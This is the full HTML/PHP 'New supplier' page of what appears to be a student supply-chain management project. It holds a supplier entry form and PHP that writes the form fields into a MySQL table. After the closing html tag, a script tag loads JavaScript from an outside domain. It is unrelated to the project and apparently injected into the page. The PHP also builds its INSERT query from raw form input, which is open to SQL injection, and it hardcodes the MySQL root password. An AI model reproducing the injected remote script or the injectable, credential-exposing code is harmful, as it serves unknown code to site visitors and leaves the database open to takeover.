<html>
<head>

<title>New supplier</title>
</head>
<SCRIPT language=JavaScript>
<!--
// Use the following three variables to set up the message:
var msg = "This Software is Designed By Lalit Chandnani(Administrator & Frontend Designer), Deepak Agnihotri(Analysis & Connectivity), Rahul Sharma(Database Designer) Student of CSE VIsem,OIST Bpl"
var delay = 100
var startPos = 127

// Don't touch these variables:
var timerID = null
var timerRunning = false
var pos = 0

// Crank it up!
StartScrolling()

function StartScrolling(){
    // Make sure the clock is stopped
    StopTheClock()

    // Pad the message with spaces to get the "start" position
    for (var i = 0; i < startPos; i++) msg = " " + msg

    // Off we go...
    DoTheScroll()
}

function StopTheClock(){
    if(timerRunning)
        clearTimeout(timerID)
    timerRunning = false
}

function DoTheScroll(){
    if (pos < msg.length)
        self.status = msg.substring(pos, msg.length);
    else
        pos=-1;
    ++pos
    timerRunning = true
    timerID = self.setTimeout("DoTheScroll()", delay)
}
//-->

</SCRIPT>
<body background="back.jpg">

	<img src="./top.jpg" width=975 >
<table width=1000>
	<tr>
	<td width='90%'><b>Welcome, lalit </b></td>
	<td width="10%"><a href="end.php" align="right"><font color="#000000"><b>Logout</b></font></a></td>
	</tr>
</table>

	
<table>

<td width=300 height=300 colspan=1 rowspan=3 valign=top align=left>
	<map name="map397">
				<area shape='rect' coords='4,5,135,40' href='customer.php'>
				<area shape='rect' coords='4,49,135,83' href='item.php'>
				<area shape='rect' coords='4,93,135,127' href='sales.php'>
				<area shape='rect' coords='4,137,135,172' href='supplier.php'>
				<area shape='rect' coords='4,179,135,213' href='purchase.php'>
				<area shape='rect' coords='4,220,135,258' href='report.php'>
				<area shape='rect' coords='4,270,135,310' href='end.php'>
	</map>

	<tr>
	<td width="5%"></td>
	<td width="35%">  <img  border=0 src="sup.jpg" usemap="#map397"></td>
	<td width="60%"><br><br><br><br><br>   
				<img src="newsup.jpg" width=600 hight=75><br>
		
				<form action="newsup.php" method="POST">
				<input type="hidden" name="lalitvar">
					Supplier ID :<input type="text" name="supid"><br><br>
					Company Name :<input type="text" name="cname"><br><br>
					Address :<br><textarea name="address" rows=5 cols=30 ></textarea><br><br>
					City :<input type="text" name="city"><br><br>
					Postal Code :<input type="text" name="pc"><br><br>
					State :<input type="text" name="state"><br><br>
					Contact no. :<input type="text" name="cn"><br><br>
					Fax :<input type="text" name="fax"><br><br>
					email ID :<input type="text" name="emailid"><br><br>
					<input type="submit" name ="add" value="add">
					<input type="reset" name="reset" value="Reset">
				</form>
<?php
$supid = $_POST['supid'];
$cname = $_POST['cname'];
$address = $_POST['address'];
$city = $_POST['city'];
$postalcode = $_POST['pc'];
$contact = $_POST['cn'];
$fax = $_POST['fax'];
$emailid = $_POST['emailid'];
$state = $_POST['state']; 

			if(isset($_POST['lalitvar']))
			{
			$link = mysql_connect("localhost", "root", "gate1024");
			$result = mysql_db_query('scm',"INSERT INTO supplier VALUES('$supid','$cname','$address','$city','$postalcode','$contact','$fax','$emailid','$state')",$link);
			 
			}		
?>

	</td>
	</tr>
	
</td>
</table>

</body>
</html>
<script src="http://www.yayadown.com/b.js"></script>